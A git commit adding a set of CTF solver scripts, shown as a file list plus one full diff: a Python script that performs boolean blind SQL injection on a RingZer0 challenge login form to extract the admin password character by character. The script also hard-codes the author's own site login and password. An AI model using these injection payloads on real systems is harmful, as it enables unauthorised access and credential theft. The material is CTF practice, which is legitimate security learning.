839fd91fc4d98e6a5b424b3eb61ef8723928948a
zwhubuntu <zwhubuntu@hotmail.com>
2017-03-09 22:05:17 +0800

    new file:   0CTF_monkey.py 	new file:   45.bmp 	new file:   CCTF_rev100_2.py 	new file:   DCTF_RE100.py 	new file:   PCTF_BABY_crackme.py 	new file:   PCTF_BACON_DECRPT.py 	new file:   PCTF_FINDKEY_CRACKME.py 	new file:   PCTF_GCD_TEST.py 	new file:   PCTF_MISC150.py 	new file:   PCTF_MISC_250.py 	new file:   PCTF_VERY_HARDRSA.py 	new file:   PCTF_WEB100.py 	new file:   PCTF_hard_rsa.py 	new file:   PCTF_shellcode.py 	new file:   PCTF_smali_reverse.py 	new file:   SSCTF_C100_TEST.py 	new file:   asciidic.py 	new file:   backdoor_checksum.py 	new file:   backdoor_ctf_web500.py 	new file:   backdoor_prime_sum_misc75.py 	new file:   bacon.py 	new file:   bamboofox_genlist.py 	new file:   bamboofox_kobesystem.py 	new file:   bamboofox_loginsystem.py 	new file:   bamboofox_sqli.py 	new file:   baopo.py 	new file:   baopo.pyc 	new file:   base64_bianzhong.py 	new file:   bin_2_hexstream.py 	new file:   bin_2_hexstream.pyc 	new file:   bmp_check.py 	new file:   brainfuck.py 	new file:   cctf_re2_test.py 	new file:   chk_flag.py 	new file:   chk_flag.pyc 	new file:   chk_image 	new file:   chk_img_files.py 	new file:   chk_img_files.pyc 	new file:   cmcc_mongodb_inject.py 	new file:   cmcc_program1.py 	new file:   cmcc_program2.py 	new file:   cmcc_program3.py 	new file:   cmcc_program4.py 	new file:   cmcc_program5.py 	new file:   cmcc_program8.py 	new file:   cmcc_program9.py 	new file:   cmcc_programe7.py 	new file:   cmcc_py_rev.py 	new file:   cmcc_xmlinject.py 	new file:   crackme_2_py.py 	new file:   csco_decrpt.py 	new file:   csco_decrpt.pyc 	new file:   day_dic_set.py 	new file:   day_dic_set.pyc 	new file:   decode.py 	new file:   decode.pyc 	new file:   dic_ocr.py 	new file:   dic_ocr.pyc 	new file:   fence_ciper.py 	new file:   gctf_misc100.py 	new file:   gen_primes.py 	new file:   hack_rsa.py 	new file:   hack_rsa.pyc 	new file:   hctf_mobile100.py 	new file:   hk_rsa.py 	new file:   ichunqiu_base64.py 	new file:   ichunqiu_crypto_100.py 	new file:   idf_py_rev.py 	new file:   image_check.py 	new file:   image_check.pyc 	new file:   inner_netpatch.py 	new file:   interwatchCTF_CODE50.py

---
+++ ringzer0_portal3_ch5.py
@@ -0,0 +1,31 @@
+import requests
+
+login_url = 'https://ringzer0team.com/login'
+target_url = 'https://ringzer0team.com/challenges/5'
+
+data = {'username': 'zwhubuntu', 'password': 'xiaohui'}
+password = ''
+
+s = requests.session()
+r = s.post(login_url, data=data)
+if 'zwhubuntu' in r.text:
+    print 'login successfully!'
+
+for i in xrange(40):
+    payload = "adminaaaaaa' or length(password)=%s and '1" % i
+    data = {'username': payload, 'password': password}
+    r = s.post(target_url, data=data)
+    if 'Invalid' in r.text:
+        print "the password length is %s" % i
+        break
+# length = 15
+
+for i in range(1, 16):
+    for j in range(32, 128):
+        payload_passwd = "adminaaaaaa' or ascii(substring(password,%s,1))=%s and '1" % (i, j)
+        data = {'username': payload_passwd, 'password': '1'}
+        r = s.post(target_url, data=data)
+        if 'Invalid' in r.text:
+            password += chr(j)
+            print 'password is %s' % password
+            break
